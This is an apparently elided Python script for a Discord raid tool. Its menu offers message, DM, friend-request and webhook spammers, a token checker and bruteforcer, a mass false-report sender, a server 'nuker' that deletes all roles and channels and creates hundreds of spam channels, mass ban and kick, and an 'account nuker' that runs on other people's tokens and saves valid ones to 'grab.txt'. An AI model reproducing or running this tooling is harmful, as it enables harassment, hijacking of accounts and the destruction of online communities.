...
def spammer():
    ...
    print(f'{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[2]{Fore.BLUE} DM Spammer    {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[8]{Fore.BLUE} Joiner             {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[14]{Fore.BLUE} Server Nuker{Fore.BLUE}{Fore.BLUE}     ║{Fore.BLUE}')
    print(f'{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[3]{Fore.BLUE} Friend Spammer{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[9]{Fore.BLUE} Leaver             {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[15]{Fore.BLUE} Account Nuker{Fore.BLUE}{Fore.BLUE}    ║{Fore.BLUE}')
    print(f'{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[4]{Fore.BLUE} Reaction Spam {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[10]{Fore.BLUE} TokenChecker      {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[16]{Fore.BLUE} Token Bruteforcer{Fore.BLUE}{Fore.BLUE}║{Fore.BLUE}')
    print(f'{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[5]{Fore.BLUE} WebhookSpammer{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[11]{Fore.BLUE} Token Onliner     {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[17]{Fore.BLUE} About{Fore.BLUE}{Fore.BLUE}            ║{Fore.BLUE}')
    print(f'{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[6]{Fore.BLUE} Typing Spammer{Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[12]{Fore.BLUE} HypeSquad Joiner  {Fore.BLUE}║{Fore.BLUE}{Fore.BLUE}[18]{Fore.BLUE} Exit{Fore.BLUE}{Fore.BLUE}             ║{Fore.BLUE}')
    print(f'{Fore.BLUE}╚══════════════════╩═══════════════════════╩══════════════════════╝{Fore.BLUE}')
    choice = int(input('[?]>'))
    ...
    if choice == 1:
        ...
        if mas == 'y':
            ...
            print(f'{Fore.BLUE}Use it with 500 members + on servers... {Fore.BLUE}')
            time.sleep(1)
            print(f'{Fore.BLUE}Use 15 tokens +{Fore.BLUE}')
            time.sleep(1)
            ...
            def spam(token, mess):
                ...
                while True:
                    ...
                    if src2.status_code == 429:
                        ...
                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.BLUE}Ratelimit for",
                              str(float(ratelimit['retry_after'])) + " seconds")
                        time.sleep(float(ratelimit['retry_after']))

                    elif src2.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}{mess} sent')

                    elif src2.status_code == 401:
                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.BLUE}Invalid token')
                    elif src2.status_code == 404:
                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.BLUE}Not found ¯\_(ツ)_/¯')
                    elif src2.status_code == 403:
                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.BLUE}Token havent got access to this channel')
        ...
        def DMSpammer(idd, message, token):
            ...
            while True:
                ...
                if r2.status_code == 429:
                    ...
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.BLUE}Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}DM sent to {idd}!")
        ...
        def friender(token, user):
            try:
                ...
                if src.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Friend request sent to {user[0]}#{user[1]}!")
        ...
        def reaction(chd, iddd, start, org, token):
            ...
            if start == '':
                ...
                if a.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Reaction {org} added! ")
                else:
                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.BLUE} Error")

            else:
                print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} ERROR, press only ENTER')
            ...
            while True:
                try:
                    ...
                    if _data.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}{message} sent")
                except:
                    print(
                        f"{Fore.LIGHTRED_EX}[-]{Fore.BLUE} Error, or wrong webhook: {Fore.LIGHTRED_EX}{webhook}{Fore.BLUE}")
                    time.sleep(5)
    ...
    if choice == 6:
        ...
        print(f"{Fore.BLUE}10 seconds to typing spam{Fore.BLUE}")

        for seconds in range(10, 0, -1):
            print(seconds)
            time.sleep(1)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Spamming')
        ...
        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Done\n")
    ...
    if choice == 7:
        ...
        print(f'{Fore.BLUE}[1]{Fore.BLUE} About Changer')
        print(f'{Fore.BLUE}[2]{Fore.BLUE} Status Changer')
        changg = int(input('[?]>'))
        if changg == 1:
            ...
            def abouttt(token, abbb):
                try:
                    ...
                    if rd.status_code == 200:
                        ...
                        print(
                            f"{Fore.LIGHTRED_EX}[-]{Fore.BLUE} Error...")
        ...
        if changg == 2:
            ...
            print(f'{Fore.BLUE}Tokens must be online to see status{Fore.BLUE}')
            text = input('Status: ')
    ...
    if choice == 9:
        ...
        with open('tokens.txt', 'r') as handle:
            ...
            print(f'{Fore.GREEN}[+]{Fore.BLUE} Successfully left guild')
                    ...
                    with open('tokens.txt', 'r') as tokens:
                        ...
                        for token in filtered:
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}{token} Valid')
                                checked.append(token)
                            else:
                                print(f'{Fore.LIGHTRED_EX}[-] {Fore.BLUE}{token} Invalid')
                    if len(checked) > 0:
                        ...
                        if save == 'y':
                            ...
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Tokens saved to {name}.txt file!')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} Error, cant open tokens.txt file...... :(!')
    ...
    if choice == 11:
        ...
        def activity(token, act):
            ...
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Activity Status: {act}')
    ...
    if choice == 12:
        ...
        print(f'''{Fore.BLUE}[1] {Fore.BLUE}{Fore.MAGENTA}Bravery{Fore.BLUE}
{Fore.BLUE}[2] {Fore.BLUE}{Fore.LIGHTRED_EX}Brilliance{Fore.BLUE}
{Fore.BLUE}[3] {Fore.BLUE}{Fore.LIGHTCYAN_EX}Balance{Fore.BLUE}
{Fore.BLUE}[4] {Fore.BLUE}Leave The HypeSquad''')
        ...
        def hype(token):
            ...
            if house == '1' or '2' or '3':
                ...
                if rep.status_code == 204:
                    ...
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} Failed')
    ...
    if choice == 13:
        ...
        sent = 0
        session = Session()
        print(f'{Fore.BLUE}[1]{Fore.BLUE} Illegal Content')
        print(f'{Fore.BLUE}[2]{Fore.BLUE} Harrassment')
        print(f'{Fore.BLUE}[3]{Fore.BLUE} Spam or Phishing Links')
        print(f'{Fore.BLUE}[4]{Fore.BLUE} Self harm')
        print(f'{Fore.BLUE}[5]{Fore.BLUE} NSFW Content')
        ...
        if r.status_code == 200:
            ...
            print(f"{Fore.LIGHTRED_EX}[-]{Fore.BLUE} Invalid Token{Fore.BLUE}")
            input()
        id = input("Server ID: ")
        ...
        def Main():
            ...
            while True:
                ...
                if r.status_code == 201:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Sent Report{Fore.BLUE} \n")
                    sent += 1
    ...
    if choice == 14:
        ...
        print(f'{Fore.BLUE}[1]{Fore.BLUE} Account server Nuker')
        print(f'{Fore.BLUE}[2]{Fore.BLUE} Bot server Nuker')
        ...
        if choicee1 == 1:
            ...
            print(f'{Fore.BLUE}[1] {Fore.BLUE}Nuker')
            print(f'{Fore.BLUE}[2] {Fore.BLUE}MassBan/MassKick')
            choicr = int(input('[?]>'))
            ...
            if choicr == 1:
                        ...
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Deleted Channel {channel}")
                                    break
                                else:
                                    break
                    ...
                    def DeleteRoles(self, guild, role):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Deleted Role {role}")
                                    break
                                else:
                                    break
                    ...
                    def SpamChannels(self, guild, name):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Created Channel ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} You cant create channels')
                    ...
                    def SpamRoles(self, guild, name):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Created Role ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} You cant create roles')
                                    break
                ...
                exit = spammer()
            if choicr == 2:
                print(f'{Fore.LIGHTRED_EX}Warning!{Fore.BLUE} If you use MassBan or MassKick with a token where the mobile number is not verified, the token will be locked automatically and you will have to verify it.')
                ...
                class MassBan:
                    ...
                    def BanMembers(self, guild, member):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Banning {member}")
                                    break
                                else:
                                    break
                    ...
                    def KickMembers(self, guild, member):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} Kicking {member}')
                                    break
                                else:
                                    break
                    ...
                    async def Menu(self):
                        print(f'{Fore.BLUE}[1]{Fore.BLUE} MassBan')
                        print(f'{Fore.BLUE}[2]{Fore.BLUE} MassKick')
        ...
        if choicee1 == 2:
            ...
            MAX_CHANNELS = 500
            print(f'{Fore.BLUE}[1]{Fore.BLUE} Nuke')
            print(f'{Fore.BLUE}[2]{Fore.BLUE} MassBan')
            ...
            if choicee == 1:
                ...
                print(f'{Fore.BLUE}For nuke write to chat: !Nuke{Fore.BLUE}')


            if choicee == 2:
                print(f'{Fore.BLUE}For for banning write to chat: !massban{Fore.BLUE}')
            ...
            async def Nuke(ctx):
                ...
                for role in guild.roles:
                    try:
                        await role.delete()
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}{role.name} Has been deleted{Fore.BLUE}')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.BLUE}{role.name} Has not been deleted')


                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}{channel.name} Has been deleted')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} You cant delete {channel}')


                try:
                    for i in range(MAX_CHANNELS):
                        await guild.create_text_channel(chanless)
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}{chanless} has been created')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} You havent got permission to create channels')
            ...
            async def on_guild_channel_create(channel):
                while True:
                    try:
                        ...
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} SPAMMIMG :)')

                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} You cant spam')
    ...
    if choice == 15:
        ...
        print(f'''{Fore.BLUE}[1]{Fore.BLUE} Server spam
{Fore.BLUE}[2]{Fore.BLUE} Remove all friends
{Fore.BLUE}[3]{Fore.BLUE} Block all friends
{Fore.BLUE}[4]{Fore.BLUE} Spam settings
{Fore.BLUE}[5]{Fore.BLUE} Leave all servers
{Fore.BLUE}[6]{Fore.BLUE} Close all DMs
{Fore.BLUE}[7]{Fore.BLUE} Send mass DM
{Fore.BLUE}[8]{Fore.BLUE} Delete all personal Servers''')
        ...
        def remove_friends(Token):
            ...
            for i in remove_friends_request:
                ...
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Removed Friend {i['id']}")
        ...
        def block_friends(Token):
            ...
            for i in block_friends_request:
                ...
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Blocked Friend {i['id']}")

        def settings(Token):
            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Starting')
        ...
        def server_leave(Token):
            ...
            for guild in leave_all_servers_request:
                ...
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Left Guild: {guild['id']}")
        ...
        def mass_dm(Token):
            ...
            for channel in mass_dm_request:
                ...
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE}Sent DMs to {channel['id']}")

        def delete_servers(Token):
            headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
            print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.BLUE} Deleting...")
            ...
            while id_to_token == id_to_token:
                ...
                try:
                    if login.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.BLUE} VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.BLUE} INVALID' + ' ' + token)
